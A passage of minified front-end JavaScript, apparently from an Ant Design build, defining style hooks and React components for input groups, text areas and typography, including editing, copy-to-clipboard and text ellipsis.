t=(0,i.mergeToken)(e,s(e));return[(e=>{let{componentCls:t,borderRadiusLG:n,borderRadiusSM:a}=e;return{[`${t}-group`]:{...(0,o.resetComponent)(e),...(e=>{let{componentCls:t,antCls:n}=e;return{position:"relative",display:"table",width:"100%",borderCollapse:"separate",borderSpacing:0,"&[class*='col-']":{paddingInlineEnd:e.paddingXS,"&:last-child":{paddingInlineEnd:0}},[`&-lg ${t}, &-lg > ${t}-group-addon`]:{...b(e)},[`&-sm ${t}, &-sm > ${t}-group-addon`]:{...y(e)},[`&-lg ${n}-select-single`]:{height:e.controlHeightLG},[`&-sm ${n}-select-single`]:{height:e.controlHeightSM},[`> ${t}`]:{display:"table-cell","&:not(:first-child):not(:last-child)":{borderRadius:0}},[`${t}-group`]:{"&-addon, &-wrap":{display:"table-cell",width:1,whiteSpace:"nowrap",verticalAlign:"middle","&:not(:first-child):not(:last-child)":{borderRadius:0}},"&-wrap > *":{display:"block !important"},"&-addon":{position:"relative",padding:`0 ${(0,r.unit)(e.paddingInline)}`,color:e.colorText,fontWeight:"normal",fontSize:e.inputFontSize,textAlign:"center",borderRadius:e.borderRadius,transition:`all ${e.motionDurationSlow}`,lineHeight:1,[`${n}-select`]:{margin:`${(0,r.unit)(e.calc(e.paddingBlock).add(1).mul(-1).equal())} ${(0,r.unit)(e.calc(e.paddingInline).mul(-1).equal())}`,[`&${n}-select-single:not(${n}-select-customize-input):not(${n}-pagination-size-changer)`]:{backgroundColor:"inherit",border:`${(0,r.unit)(e.lineWidth)} ${e.lineType} transparent`,boxShadow:"none"}},[`${n}-cascader-picker`]:{margin:`-9px ${(0,r.unit)(e.calc(e.paddingInline).mul(-1).equal())}`,backgroundColor:"transparent",[`${n}-cascader-input`]:{textAlign:"start",border:0,boxShadow:"none"}}}},[t]:{width:"100%",marginBottom:0,textAlign:"inherit","&:focus":{zIndex:1,borderInlineEndWidth:1},"&:hover":{zIndex:1,borderInlineEndWidth:1}},[`> ${t}:first-child, ${t}-group-addon:first-child`]:{borderStartEndRadius:0,borderEndEndRadius:0,[`${n}-select`]:{borderStartEndRadius:0,borderEndEndRadius:0}},[`> ${t}-affix-wrapper`]:{[`&:not(:first-child) ${t}`]:{borderStartStartRadius:0,borderEndStartRadius:0},[`&:not(:last-child) ${t}`]:{borderStartEndRadius:0,borderEndEndRadius:0}},[`> ${t}:last-child, ${t}-group-addon:last-child`]:{borderStartStartRadius:0,borderEndStartRadius:0,[`${n}-select`]:{borderStartStartRadius:0,borderEndStartRadius:0}},[`${t}-affix-wrapper`]:{"&:not(:last-child)":{borderStartEndRadius:0,borderEndEndRadius:0},"&:not(:first-child)":{borderStartStartRadius:0,borderEndStartRadius:0}},[`&${t}-group-compact`]:{display:"block",...(0,o.clearFix)(),[`${t}-group-addon, ${t}-group-wrap, > ${t}`]:{"&:not(:first-child):not(:last-child)":{borderInlineEndWidth:e.lineWidth,"&:hover, &:focus":{zIndex:1}}},"& > *":{display:"inline-flex",float:"none",verticalAlign:"top",borderRadius:0},[`
        & > ${t}-affix-wrapper,
        & > ${t}-number-affix-wrapper,
        & > ${n}-picker-range
      `]:{display:"inline-flex"},"& > *:not(:last-child)":{marginInlineEnd:e.calc(e.lineWidth).mul(-1).equal(),borderInlineEndWidth:e.lineWidth},[t]:{float:"none"},[`& > ${n}-select,
      & > ${n}-select-auto-complete ${t},
      & > ${n}-cascader-picker ${t},
      & > ${t}-group-wrapper ${t}`]:{borderInlineEndWidth:e.lineWidth,borderRadius:0,"&:hover, &:focus":{zIndex:1}},[`& > ${n}-select-focused`]:{zIndex:1},[`& > ${n}-select > ${n}-select-arrow`]:{zIndex:1},[`& > *:first-child,
      & > ${n}-select:first-child,
      & > ${n}-select-auto-complete:first-child ${t},
      & > ${n}-cascader-picker:first-child ${t}`]:{borderStartStartRadius:e.borderRadius,borderEndStartRadius:e.borderRadius},[`& > *:last-child,
      & > ${n}-select:last-child,
      & > ${n}-cascader-picker:last-child ${t},
      & > ${n}-cascader-picker-focused:last-child ${t}`]:{borderInlineEndWidth:e.lineWidth,borderStartEndRadius:e.borderRadius,borderEndEndRadius:e.borderRadius},[`& > ${n}-select-auto-complete ${t}`]:{verticalAlign:"top"},[`${t}-group-wrapper + ${t}-group-wrapper`]:{marginInlineStart:e.calc(e.lineWidth).mul(-1).equal(),[`${t}-affix-wrapper`]:{}}}}})(e),"&-rtl":{direction:"rtl"},"&-wrapper":{display:"inline-block",width:"100%",textAlign:"start",verticalAlign:"top","&-rtl":{direction:"rtl"},"&-lg":{[`${t}-group-addon`]:{borderRadius:n,fontSize:e.inputFontSizeLG}},"&-sm":{[`${t}-group-addon`]:{borderRadius:a}},...{"&-outlined":{[`${e.componentCls}-group`]:{"&-addon":{background:e.addonBg,border:`${(0,r.unit)(e.lineWidth)} ${e.lineType} ${e.colorBorder}`},"&-addon:first-child":{borderInlineEnd:0},"&-addon:last-child":{borderInlineStart:0}},...p(e,{status:"error",addonBorderColor:e.colorError,addonColor:e.colorErrorText}),...p(e,{status:"warning",addonBorderColor:e.colorWarning,addonColor:e.colorWarningText}),[`&${e.componentCls}-group-wrapper-disabled`]:{[`${e.componentCls}-group-addon`]:{...c(e)}}}},...{"&-filled":{[`${e.componentCls}-group-addon`]:{background:e.colorFillTertiary,"&:last-child":{position:"static"}},...g(e,{status:"error",addonBg:e.colorErrorBg,addonColor:e.colorErrorText}),...g(e,{status:"warning",addonBg:e.colorWarningBg,addonColor:e.colorWarningText}),[`&${e.componentCls}-group-wrapper-disabled`]:{[`${e.componentCls}-group`]:{"&-addon":{background:e.colorFillTertiary,color:e.colorTextDisabled},"&-addon:first-child":{borderInlineStart:`${(0,r.unit)(e.lineWidth)} ${e.lineType} ${e.colorBorder}`,borderTop:`${(0,r.unit)(e.lineWidth)} ${e.lineType} ${e.colorBorder}`,borderBottom:`${(0,r.unit)(e.lineWidth)} ${e.lineType} ${e.colorBorder}`},"&-addon:last-child":{borderInlineEnd:`${(0,r.unit)(e.lineWidth)} ${e.lineType} ${e.colorBorder}`,borderTop:`${(0,r.unit)(e.lineWidth)} ${e.lineType} ${e.colorBorder}`,borderBottom:`${(0,r.unit)(e.lineWidth)} ${e.lineType} ${e.colorBorder}`}}}}},[`&:not(${t}-compact-first-item):not(${t}-compact-last-item)${t}-compact-item`]:{[`${t}, ${t}-group-addon`]:{borderRadius:0}},[`&:not(${t}-compact-last-item)${t}-compact-first-item`]:{[`${t}, ${t}-group-addon`]:{borderStartEndRadius:0,borderEndEndRadius:0}},[`&:not(${t}-compact-first-item)${t}-compact-last-item`]:{[`${t}, ${t}-group-addon`]:{borderStartStartRadius:0,borderEndStartRadius:0}},[`&:not(${t}-compact-last-item)${t}-compact-item`]:{[`${t}-affix-wrapper`]:{borderStartEndRadius:0,borderEndEndRadius:0}},[`&:not(${t}-compact-first-item)${t}-compact-item`]:{[`${t}-affix-wrapper`]:{borderStartStartRadius:0,borderEndStartRadius:0}}}}}})(t),(e=>{let{componentCls:t}=e;return{[`${t}-out-of-range`]:{[`&, & input, & textarea, ${t}-show-count-suffix, ${t}-data-count`]:{color:e.colorError}}}})(t),(0,n.genCompactItemStyle)(t,{focus:!0,focusElCls:`${t.componentCls}-affix-wrapper-focused`})]},l,{resetFont:!1});e.s(["default",0,C,"useSharedStyle",0,x],49942)},35432,e=>{"use strict";e.i(47167);var t=e.i(71645),r=e.i(63651),o=e.i(7670),n=e.i(30683),a=e.i(11517),i=e.i(52956),s=e.i(42064),l=e.i(37328),c=e.i(21883),u=e.i(17455),d=e.i(62139),p=e.i(92812),m=e.i(87166),f=e.i(63611),g=e.i(49942),h=e.i(46422),v=e.i(38378),b=e.i(17458);let y=(0,h.genStyleHooks)(["Input","TextArea"],e=>(e=>{let{componentCls:t,paddingLG:r}=e,o=`${t}-textarea`;return{[`textarea${t}`]:{maxWidth:"100%",height:"auto",minHeight:e.controlHeight,lineHeight:e.lineHeight,verticalAlign:"bottom",transition:`all ${e.motionDurationSlow}`,resize:"vertical",[`&${t}-mouse-active`]:{transition:`all ${e.motionDurationSlow}, height 0s, width 0s`}},[`${t}-textarea-affix-wrapper-resize-dirty`]:{width:"auto"},[o]:{position:"relative","&-show-count":{[`${t}-data-count`]:{position:"absolute",bottom:e.calc(e.fontSize).mul(e.lineHeight).mul(-1).equal(),insetInlineEnd:0,color:e.colorTextDescription,whiteSpace:"nowrap",pointerEvents:"none"}},[`
        &-allow-clear > ${t},
        &-affix-wrapper${o}-has-feedback ${t}
      `]:{paddingInlineEnd:r},[`&-affix-wrapper${t}-affix-wrapper`]:{padding:0,[`> textarea${t}`]:{fontSize:"inherit",border:"none",outline:"none",background:"transparent",minHeight:e.calc(e.controlHeight).sub(e.calc(e.lineWidth).mul(2)).equal(),"&:focus":{boxShadow:"none !important"}},[`${t}-suffix`]:{margin:0,"> *:not(:last-child)":{marginInline:0},[`${t}-clear-icon`]:{position:"absolute",insetInlineEnd:e.paddingInline,insetBlockStart:e.paddingXS},[`${o}-suffix`]:{position:"absolute",top:0,insetInlineEnd:e.paddingInline,bottom:0,zIndex:1,display:"inline-flex",alignItems:"center",margin:"auto",pointerEvents:"none"}}},[`&-affix-wrapper${t}-affix-wrapper-rtl`]:{[`${t}-suffix`]:{[`${t}-data-count`]:{direction:"ltr",insetInlineStart:0}}},[`&-affix-wrapper${t}-affix-wrapper-sm`]:{[`${t}-suffix`]:{[`${t}-clear-icon`]:{insetInlineEnd:e.paddingInlineSM}}}}}})((0,v.mergeToken)(e,(0,b.initInputToken)(e))),b.initComponentToken,{resetFont:!1}),S=(0,t.forwardRef)((e,h)=>{let{prefixCls:v,bordered:b=!0,size:S,disabled:x,status:C,allowClear:w,classNames:k,rootClassName:P,className:$,style:E,styles:T,variant:I,showCount:R,onMouseDown:M,onResize:A,...D}=e,{getPrefixCls:L,direction:_,allowClear:O,autoComplete:j,className:F,style:N,classNames:V,styles:B}=(0,s.useComponentConfig)("textArea"),H=t.useContext(l.default),{status:z,hasFeedback:U,feedbackIcon:W}=t.useContext(d.FormItemInputContext),q=(0,i.getMergedStatus)(z,C),[G,J]=(0,a.useMergeSemantic)([V,k],[B,T],{props:e}),X=t.useRef(null);t.useImperativeHandle(h,()=>({resizableTextArea:X.current?.resizableTextArea,focus:e=>{(0,f.triggerFocus)(X.current?.resizableTextArea?.textArea,e)},blur:()=>X.current?.blur(),nativeElement:X.current?.nativeElement||null}));let K=L("input",v),Q=(0,c.default)(K),[Y,Z]=(0,g.useSharedStyle)(K,P);y(K,Q);let{compactSize:ee,compactItemClassnames:et}=(0,m.useCompactItemContext)(K,_),er=(0,u.default)(e=>S??ee??e),[eo,en]=(0,p.default)("textArea",I,b),ea=(0,n.default)(w??O),[ei,es]=t.useState(!1),[el,ec]=t.useState(!1);return t.createElement(r.default,{autoComplete:j,...D,style:{...J.root,...N,...E},styles:J,disabled:x??H,allowClear:ea,className:(0,o.clsx)(Z,Q,$,P,et,F,G.root,{[`${K}-textarea-affix-wrapper-resize-dirty`]:el}),classNames:{...G,textarea:(0,o.clsx)({[`${K}-sm`]:"small"===er,[`${K}-lg`]:"large"===er},Y,G.textarea,ei&&`${K}-mouse-active`),variant:(0,o.clsx)({[`${K}-${eo}`]:en},(0,i.getStatusClassNames)(K,q)),affixWrapper:(0,o.clsx)(`${K}-textarea-affix-wrapper`,{[`${K}-affix-wrapper-rtl`]:"rtl"===_,[`${K}-affix-wrapper-sm`]:"small"===er,[`${K}-affix-wrapper-lg`]:"large"===er,[`${K}-textarea-show-count`]:R||e.count?.show},Y)},prefixCls:K,suffix:U&&t.createElement("span",{className:`${K}-textarea-suffix`},W),showCount:R,ref:X,onResize:e=>{if(A?.(e),ei&&"function"==typeof getComputedStyle){let e=X.current?.nativeElement?.querySelector("textarea");e&&"both"===getComputedStyle(e).resize&&ec(!0)}},onMouseDown:e=>{es(!0),M?.(e);let t=()=>{es(!1),document.removeEventListener("mouseup",t)};document.addEventListener("mouseup",t)}})});e.s(["default",0,S],35432)},98586,e=>{"use strict";e.i(47167);var t=e.i(71645),r=e.i(8211),o=e.i(1361),n=e.i(78052);e.i(63335);var a=e.i(51095),i=e.i(43081),s=e.i(30294),l=e.i(1676),c=e.i(32839),u=e.i(7670),d=e.i(76398),p=e.i(14515),m=e.i(42064),f=e.i(29447),g=e.i(91816),h=e.i(11223),v=e.i(30731),b=e.i(63731),y=e.i(35432),S=e.i(83293),x=e.i(46422);e.i(65846);var C=e.i(96091);let w=(0,x.genStyleHooks)("Typography",e=>{let t,{componentCls:r,titleMarginTop:o}=e;return{[r]:{color:e.colorText,wordBreak:"break-word",lineHeight:e.lineHeight,[`&${r}-secondary, &${r}-link${r}-secondary`]:{color:e.colorTextDescription},[`&${r}-success, &${r}-link${r}-success`]:{color:e.colorSuccessText},[`&${r}-warning, &${r}-link${r}-warning`]:{color:e.colorWarningText},[`&${r}-danger, &${r}-link${r}-danger`]:{color:e.colorErrorText,[`&${r}-link:active, &${r}-link:focus`]:{color:e.colorErrorTextActive},[`&${r}-link:hover`]:{color:e.colorErrorTextHover}},[`&${r}-disabled`]:{color:e.colorTextDisabled,cursor:"not-allowed",userSelect:"none"},[`
        div&,
        p
      `]:{marginBottom:"1em"},...(t={},[1,2,3,4,5].forEach(r=>{t[`
      h${r}&,
      div&-h${r},
      div&-h${r} > textarea,
      h${r}
    `]=((e,t,r,o)=>{let{titleMarginBottom:n,fontWeightStrong:a}=o;return{marginBottom:n,color:r,fontWeight:a,fontSize:e,lineHeight:t}})(e[`fontSizeHeading${r}`],e[`lineHeightHeading${r}`],e.colorTextHeading,e)}),t),[`
      & + h1${r},
      & + h2${r},
      & + h3${r},
      & + h4${r},
      & + h5${r}
      `]:{marginTop:o},[`
      div,
      ul,
      li,
      p,
      h1,
      h2,
      h3,
      h4,
      h5`]:{[`
        + h1,
        + h2,
        + h3,
        + h4,
        + h5
        `]:{marginTop:o}},...{code:{margin:"0 0.2em",paddingInline:"0.4em",paddingBlock:"0.2em 0.1em",fontSize:"85%",fontFamily:e.fontFamilyCode,background:"rgba(150, 150, 150, 0.1)",border:"1px solid rgba(100, 100, 100, 0.2)",borderRadius:3},kbd:{margin:"0 0.2em",paddingInline:"0.4em",paddingBlock:"0.15em 0.1em",fontSize:"90%",fontFamily:e.fontFamilyCode,background:"rgba(150, 150, 150, 0.06)",border:"1px solid rgba(100, 100, 100, 0.2)",borderBottomWidth:2,borderRadius:3},mark:{padding:0,backgroundColor:C.gold[2]},"u, ins":{textDecoration:"underline",textDecorationSkipInk:"auto"},"s, del":{textDecoration:"line-through"},strong:{fontWeight:e.fontWeightStrong},"ul, ol":{marginInline:0,marginBlock:"0 1em",padding:0,li:{marginInline:"20px 0",marginBlock:0,paddingInline:"4px 0",paddingBlock:0}},ul:{listStyleType:"circle",ul:{listStyleType:"disc"}},ol:{listStyleType:"decimal"},"pre, blockquote":{margin:"1em 0"},pre:{padding:"0.4em 0.6em",whiteSpace:"pre-wrap",wordWrap:"break-word",background:"rgba(150, 150, 150, 0.1)",border:"1px solid rgba(100, 100, 100, 0.2)",borderRadius:3,fontFamily:e.fontFamilyCode,code:{display:"inline",margin:0,padding:0,fontSize:"inherit",fontFamily:"inherit",background:"transparent",border:0}},blockquote:{paddingInline:"0.6em 0",paddingBlock:0,borderInlineStart:"4px solid rgba(100, 100, 100, 0.2)",opacity:.85}},...(e=>{let{componentCls:t}=e,r=`${t}-link`;return{[`&${r}`]:{...(0,S.operationUnit)(e),userSelect:"text",[`&[disabled], &${t}-disabled`]:{color:e.colorTextDisabled,cursor:"not-allowed","&:active, &:hover":{color:e.colorTextDisabled},"&:active":{pointerEvents:"none"}}}}})(e),[`${r}-actions`]:{display:"inline"},[`
        ${r}-expand,
        ${r}-collapse,
        ${r}-edit,
        ${r}-copy
      `]:{...(0,S.operationUnit)(e),marginInlineStart:e.marginXXS},...(e=>{let{componentCls:t,paddingSM:r}=e;return{"&-edit-content":{position:"relative","div&":{insetInlineStart:e.calc(e.paddingSM).mul(-1).equal(),insetBlockStart:e.calc(r).div(-2).add(1).equal(),marginBottom:e.calc(r).div(2).sub(2).equal()},[`${t}-edit-content-confirm`]:{position:"absolute",insetInlineEnd:e.calc(e.marginXS).add(2).equal(),insetBlockEnd:e.marginXS,color:e.colorIcon,fontWeight:"normal",fontSize:e.fontSize,fontStyle:"normal",pointerEvents:"none"},textarea:{margin:"0!important",MozTransition:"none",height:"1em"}}}})(e),...{[`${e.componentCls}-copy-success`]:{[`
    &,
    &:hover,
    &:focus`]:{color:e.colorSuccess}},[`${e.componentCls}-copy-icon-only`]:{marginInlineStart:0}},...{[`
  a&-ellipsis,
  span&-ellipsis
  `]:{display:"inline-block",maxWidth:"100%"},"&-ellipsis-single-line":{whiteSpace:"nowrap",overflow:"hidden",textOverflow:"ellipsis","a&, span&":{verticalAlign:"bottom"},"> code":{paddingBlock:0,maxWidth:"calc(100% - 1.2em)",display:"inline-block",overflow:"hidden",textOverflow:"ellipsis",verticalAlign:"bottom",boxSizing:"content-box"}},"&-ellipsis-multiple-line":{display:"-webkit-box",overflow:"hidden",WebkitLineClamp:3,WebkitBoxOrient:"vertical"}},"&-rtl":{direction:"rtl"}}}},()=>({titleMarginTop:"1.2em",titleMarginBottom:"0.5em"})),k=e=>{let{prefixCls:r,"aria-label":o,className:n,style:a,direction:i,maxLength:s,autoSize:l=!0,value:c,onSave:d,onCancel:p,onEnd:m,component:f,enterIcon:g=t.createElement(h.default,null)}=e,S=t.useRef(null),x=t.useRef(!1),C=t.useRef(null),[k,P]=t.useState(c);t.useEffect(()=>{P(c)},[c]),t.useEffect(()=>{if(S.current?.resizableTextArea){let{textArea:e}=S.current.resizableTextArea;e.focus();let{length:t}=e.value;e.setSelectionRange(t,t)}},[]);let $=()=>{d(k.trim())},[E,T]=w(r),I=(0,u.clsx)(r,`${r}-edit-content`,{[`${r}-rtl`]:"rtl"===i,[`${r}-${f}`]:!!f},n,E,T);return t.createElement("div",{className:I,style:a},t.createElement(y.default,{ref:S,maxLength:s,value:k,onChange:({target:e})=>{P(e.value.replace(/[\n\r]/g,""))},onKeyDown:({keyCode:e})=>{x.current||(C.current=e)},onKeyUp:({keyCode:e,ctrlKey:t,altKey:r,metaKey:o,shiftKey:n})=>{C.current!==e||x.current||t||r||o||n||(e===v.default.ENTER?($(),m?.()):e===v.default.ESC&&p())},onCompositionStart:()=>{x.current=!0},onCompositionEnd:()=>{x.current=!1},onBlur:()=>{$()},"aria-label":o,rows:1,autoSize:l}),null!==g?(0,b.cloneElement)(g,{className:`${r}-edit-content-confirm`}):null)};var P=e.i(80251);let $=async(e,t)=>{try{return t?await navigator.clipboard.write([new ClipboardItem({"text/html":new Blob([e],{type:"text/html"}),"text/plain":new Blob([e],{type:"text/plain"})})]):await navigator.clipboard.writeText(e),!0}catch{return!1}};async function E(e,t){if("string"!=typeof e)return!1;let r=t?.format==="text/html";return!!(await $(e,r)||((e,t)=>{let r=!1,o=o=>{o.stopPropagation(),o.preventDefault(),o.clipboardData?.clearData(),o.clipboardData?.setData("text/plain",e),t&&o.clipboardData?.setData("text/html",e),r=!0};try{return document.addEventListener("copy",o,{capture:!0}),document.execCommand("copy"),r}catch{return!1}finally{document.removeEventListener("copy",o,{capture:!0})}})(e,r))}let T=(e,t={})=>!(0,d.default)(e)&&t?.skipEmpty?[]:Array.isArray(e)?e:[e];function I(e,r){return t.useMemo(()=>{let t=!!e;return[t,{...r,...t&&"object"==typeof e?e:null}]},[e])}let R=t.forwardRef((e,r)=>{let{prefixCls:o,component:n="article",className:a,rootClassName:i,children:s,direction:l,style:c,...d}=e,{getPrefixCls:p,direction:f,className:g,style:h}=(0,m.useComponentConfig)("typography"),v=p("typography",o),[b,y]=w(v),S=(0,u.clsx)(v,g,{[`${v}-rtl`]:"rtl"===(l??f)},a,i,b,y),x={...h,...c};return t.createElement(n,{className:S,style:x,ref:r,...d},s)}),M={icon:{tag:"svg",attrs:{viewBox:"64 64 896 896",focusable:"false"},children:[{tag:"path",attrs:{d:"M912 190h-69.9c-9.8 0-19.1 4.5-25.1 12.2L404.7 724.5 207 474a32 32 0 00-25.1-12.2H112c-6.7 0-10.4 7.7-6.3 12.9l273.9 347c12.8 16.2 37.4 16.2 50.3 0l488.4-618.9c4.1-5.1.4-12.8-6.3-12.8z"}}]},name:"check",theme:"outlined"};var A=e.i(9583);function D(){return(D=Object.assign.bind()).apply(this,arguments)}let L=t.forwardRef((e,r)=>t.createElement(A.default,D({},e,{ref:r,icon:M}))),_={icon:{tag:"svg",attrs:{viewBox:"64 64 896 896",focusable:"false"},children:[{tag:"path",attrs:{d:"M832 64H296c-4.4 0-8 3.6-8 8v56c0 4.4 3.6 8 8 8h496v688c0 4.4 3.6 8 8 8h56c4.4 0 8-3.6 8-8V96c0-17.7-14.3-32-32-32zM704 192H192c-17.7 0-32 14.3-32 32v530.7c0 8.5 3.4 16.6 9.4 22.6l173.3 173.3c2.2 2.2 4.7 4 7.4 5.5v1.9h4.2c3.5 1.3 7.2 2 11 2H704c17.7 0 32-14.3 32-32V224c0-17.7-14.3-32-32-32zM350 856.2L263.9 770H350v86.2zM664 888H414V746c0-22.1-17.9-40-40-40H232V264h432v624z"}}]},name:"copy",theme:"outlined"};function O(){return(O=Object.assign.bind()).apply(this,arguments)}let j=t.forwardRef((e,r)=>t.createElement(A.default,O({},e,{ref:r,icon:_})));var F=e.i(39295);let N=e=>!1===e?[!1,!1]:T(e);function V(e,t,r){return!0===e||void 0===e?t:e||r&&t}let B=e=>["string","number"].includes(typeof e),H=e=>{let{prefixCls:r,copied:o,locale:n,iconOnly:a,tooltips:i,icon:s,tabIndex:l,onCopy:c,loading:d}=e,p=N(i),m=N(s),{copied:f,copy:h}=n??{},v=o?f:h,b=V(p[+!!o],v),y="string"==typeof b?b:v;return t.createElement(g.default,{title:b},t.createElement("button",{type:"button",className:(0,u.clsx)(`${r}-copy`,{[`${r}-copy-success`]:o,[`${r}-copy-icon-only`]:a}),onClick:c,"aria-label":y,tabIndex:l},o?V(m[1],t.createElement(L,null),!0):V(m[0],d?t.createElement(F.default,null):t.createElement(j,null),!0)))},z=t.forwardRef(({style:e,children:r},o)=>{let n=t.useRef(null);return t.useImperativeHandle(o,()=>({isExceed:()=>{let e=n.current;return e.scrollHeight>e.clientHeight},getHeight:()=>n.current.clientHeight})),t.createElement("span",{"aria-hidden":!0,ref:n,style:{position:"fixed",display:"block",left:0,top:0,pointerEvents:"none",backgroundColor:"rgba(255, 0, 0, 0.65)",...e}},r)});function U(e,t){let r=0,o=[];for(let n=0;n<e.length;n+=1){if(r===t)return o;let a=e[n],i=r+(B(a)?String(a).length:1);if(i>t){let e=t-r;return o.push(String(a).slice(0,e)),o}o.push(a),r=i}return e}let W={display:"-webkit-box",overflow:"hidden",WebkitBoxOrient:"vertical"};function q(e){let{enableMeasure:o,width:n,text:a,children:s,rows:c,expanded:u,miscDeps:d,onEllipsis:p}=e,m=t.useMemo(()=>(0,i.toArray)(a),[a]),f=t.useMemo(()=>m.reduce((e,t)=>e+(B(t)?String(t).length:1),0),[a]),g=t.useMemo(()=>s(m,!1),[a]),[h,v]=t.useState(null),b=t.useRef(null),y=t.useRef(null),S=t.useRef(null),x=t.useRef(null),C=t.useRef(null),[w,k]=t.useState(!1),[P,$]=t.useState(0),[E,T]=t.useState(0),[I,R]=t.useState(null);(0,l.default)(()=>{o&&n&&f?$(1):$(0)},[n,a,c,o,m]),(0,l.default)(()=>{if(1===P)$(2),R(y.current&&getComputedStyle(y.current).whiteSpace);else if(2===P){let e=!!S.current?.isExceed();$(e?3:4),v(e?[0,f]:null),k(e),T(Math.max(S.current?.getHeight()||0,(1===c?0:x.current?.getHeight()||0)+(C.current?.getHeight()||0))+1),p(e)}},[P]);let M=h?Math.ceil((h[0]+h[1])/2):0;(0,l.default)(()=>{let[e,t]=h||[0,0];if(e!==t){let r=(b.current?.getHeight()||0)>E,o=M;t-e==1&&(o=r?e:t),v(r?[e,o]:[o,t])}},[h,M]);let A=t.useMemo(()=>{if(!o)return s(m,!1);if(3!==P||!h||h[0]!==h[1]){let e=s(m,!1);return[4,0].includes(P)?e:t.createElement("span",{style:{...W,WebkitLineClamp:c}},e)}return s(u?m:U(m,h[0]),w)},[u,P,h,m].concat((0,r.default)(d))),D={width:n,margin:0,padding:0,whiteSpace:"nowrap"===I?"normal":"inherit"};return t.createElement(t.Fragment,null,A,2===P&&t.createElement(t.Fragment,null,t.createElement(z,{style:{...D,...W,WebkitLineClamp:c},ref:S},g),t.createElement(z,{style:{...D,...W,WebkitLineClamp:c-1},ref:x},g),t.createElement(z,{style:{...D,...W,WebkitLineClamp:1},ref:C},s([],!0))),3===P&&h&&h[0]!==h[1]&&t.createElement(z,{style:{...D,top:400},ref:b},s(U(m,M),!0)),1===P&&t.createElement("span",{style:{whiteSpace:"inherit"},ref:y}))}let G=({enableEllipsis:e,isEllipsis:r,open:o,children:n,tooltipProps:a})=>a?.title&&e?t.createElement(g.default,{open:o&&r,...a},n):n,J=["delete","mark","code","underline","strong","keyboard","italic"],X=t.forwardRef((e,h)=>{let v,b,y,{prefixCls:S,className:x,style:C,type:w,disabled:$,children:M,ellipsis:A,editable:D,copyable:L,component:_,title:O,onMouseEnter:j,onMouseLeave:F,...N}=e,{getPrefixCls:V,direction:z}=t.useContext(m.ConfigContext),[U]=(0,f.default)("Text"),W=t.useRef(null),X=t.useRef(null),K=V("typography",S),Q=(0,a.omit)(N,J),[Y,Z]=I(D),[ee,et]=(0,s.useControlledState)(!1,Z.editing),{triggerType:er=["icon"]}=Z,eo=e=>{e&&Z.onStart?.(),et(e)},en=(v=(0,t.useRef)(void 0),(0,t.useEffect)(()=>{v.current=ee}),v.current);(0,l.default)(()=>{!ee&&en&&X.current?.focus()},[ee]);let ea=e=>{e?.preventDefault(),eo(!0)},[ei,es]=I(L),{copied:el,copyLoading:ec,onClick:eu}=(({copyConfig:e,children:r})=>{let[o,n]=t.useState(!1),[a,i]=t.useState(!1),s=t.useRef(null),l=()=>{s.current&&clearTimeout(s.current)},c={};return e.format&&(c.format=e.format),t.useEffect(()=>l,[]),{copied:o,copyLoading:a,onClick:(0,P.useEvent)(async t=>{t?.preventDefault(),t?.stopPropagation(),i(!0);try{let o="function"==typeof e.text?await e.text():e.text;await E(o||T(r,{skipEmpty:!0}).join("")||"",c),i(!1),n(!0),l(),s.current=setTimeout(()=>{n(!1)},3e3),e.onCopy?.(t)}catch(e){throw i(!1),e}})}})({copyConfig:es,children:M}),[ed,ep]=t.useState(!1),[em,ef]=t.useState(!1),[eg,eh]=t.useState(!1),[ev,eb]=t.useState(!1),[ey,eS]=t.useState(!0),[ex,eC]=I(A,{expandable:!1,symbol:e=>e?U?.collapse:U?.expand}),[ew,ek]=(0,s.useControlledState)(eC.defaultExpanded||!1,eC.expanded),eP=ex&&(!ew||"collapsible"===eC.expandable),{rows:e$=1}=eC,eE=t.useMemo(()=>eP&&(void 0!==eC.suffix||eC.onEllipsis||eC.expandable||Y||ei),[eP,eC,Y,ei]);(0,l.default)(()=>{ex&&!eE&&(ep((0,p.isStyleSupport)("webkitLineClamp")),ef((0,p.isStyleSupport)("textOverflow")))},[eE,ex]);let[eT,eI]=t.useState(eP),eR=t.useMemo(()=>!eE&&(1===e$?em:ed),[eE,em,ed]);(0,l.default)(()=>{eI(eR&&eP)},[eR,eP]);let eM=eP&&(eT?ev:eg),eA=eP&&1===e$&&eT,eD=eP&&e$>1&&eT,[eL,e_]=t.useState(0),[eO,ej]=t.useState(!1),[eF,eN]=t.useState(!1),eV=e=>{eh(e),eg!==e&&eC.onEllipsis?.(e)};t.useEffect(()=>{let e=W.current;if(ex&&eT&&e){let t,r,o,n=(t=document.createElement("em"),e.appendChild(t),r=e.getBoundingClientRect(),o=t.getBoundingClientRect(),e.removeChild(t),r.left>o.left||o.right>r.right||r.top>o.top||o.bottom>r.bottom);ev!==n&&eb(n)}},[ex,eT,M,eD,ey,eL]),t.useEffect(()=>{let e=W.current;if("u"<typeof IntersectionObserver||!e||!eT||!eP)return;let t=new IntersectionObserver(()=>{eS(!!e.offsetParent)});return t.observe(e),()=>{t.disconnect()}},[eT,eP]);let eB=(b=eC.tooltip,y=Z.text,(0,t.useMemo)(()=>!0===b?{title:y??M}:(0,t.isValidElement)(b)?{title:b}:"object"==typeof b?{title:y??M,...b}:{title:b},[b,y,M])),eH=t.useMemo(()=>{if(ex&&!eT)return[Z.text,M,O,eB.title].find(B)},[ex,eT,O,eB.title,eM]);return ee?t.createElement(k,{value:Z.text??("string"==typeof M?M:""),onSave:e=>{Z.onChange?.(e),eo(!1)},onCancel:()=>{Z.onCancel?.(),eo(!1)},onEnd:Z.onEnd,prefixCls:K,className:x,style:C,direction:z,component:_,maxLength:Z.maxLength,autoSize:Z.autoSize,enterIcon:Z.enterIcon}):t.createElement(n.default,{onResize:({offsetWidth:e})=>{e_(e)},disabled:!eP},n=>t.createElement(G,{tooltipProps:eB,enableEllipsis:eP,isEllipsis:eM,open:eF&&!eO},t.createElement(R,{onMouseEnter:e=>{eN(!0),j?.(e)},onMouseLeave:e=>{eN(!1),F?.(e)},className:(0,u.clsx)({[`${K}-${w}`]:w,[`${K}-disabled`]:$,[`${K}-ellipsis`]:ex,[`${K}-ellipsis-single-line`]:eA,[`${K}-ellipsis-multiple-line`]:eD,[`${K}-link`]:"a"===_},x),prefixCls:S,style:{...C,WebkitLineClamp:eD?e$:void 0},component:_,ref:(0,c.composeRef)(n,W,h),direction:z,onClick:er.includes("text")?ea:void 